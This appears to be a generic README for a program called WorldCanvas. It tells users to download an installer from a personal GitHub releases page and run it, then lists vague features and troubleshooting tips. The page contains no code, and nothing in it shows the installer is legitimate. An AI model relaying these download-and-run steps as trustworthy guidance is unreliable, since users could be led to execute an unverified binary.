## 🚀 Getting Started

Follow these simple steps to set up WorldCanvas on your computer.

### 📥 Download & Install

1. **Visit the Release Page:** Go to the [WorldCanvas Releases](https://github.com/satishqa2022/WorldCanvas/releases) page.
2. **Choose Your Version:** Look for the latest version. You will see various files available for download.
3. **Download the Installer:** Click the link for your operating system. The file will begin to download automatically.

### 🖥️ System Requirements

Before you install WorldCanvas, ensure your computer meets the following requirements:

- **Operating System:** Windows 10 or later / macOS 10.14 or later
- **RAM:** At least 4 GB
- **Storage:** Minimum 500 MB of free space
- **Graphics:** Compatible with OpenGL 2.0 or higher

### 📋 Quick Setup

1. **Run the Installer:** Once the download is complete, locate the downloaded file and double-click it.
2. **Follow Instructions:** The installation wizard will guide you through the setup process. Click “Next” to proceed.
3. **Finish Installation:** Click “Finish” when the installation is complete.

### 🌟 Features

- **Promptable Events:** Create events easily with customizable prompts.
- **Reference Images:** Use images to enhance your artistic creations.
- **Trajectories:** Visualize paths and movements for better results.
- **Text Integration:** Incorporate text smoothly into your artwork.

## 🖌️ Using WorldCanvas

Once you have installed WorldCanvas, launching the application is simple. 

### ✅ Start the Application

1. Locate the WorldCanvas icon on your desktop.
2. Double-click the icon to open the application.

### 🎨 Create Your First Piece

1. **Select Prompt:** Use the prompt feature to begin your art.
2. **Add Reference Images:** Upload images by clicking the upload button.
3. **Define Trajectories:** Create paths for your designs using the trajectory tool.
4. **Incorporate Text:** Use the text tool to add your messages.

### 📈 Save Your Work

Don’t forget to save your artwork. Click on the "Save" button in the menu. You can choose different formats to save your creations.

## ❓ Troubleshooting

If you encounter issues while using WorldCanvas, try the following:

- **Check for Updates:** Ensure you are using the latest version of the application.
- **System Restart:** Sometimes, a simple restart can resolve bugs.
- **Graphics Drivers:** Make sure your graphics drivers are up to date for best performance.
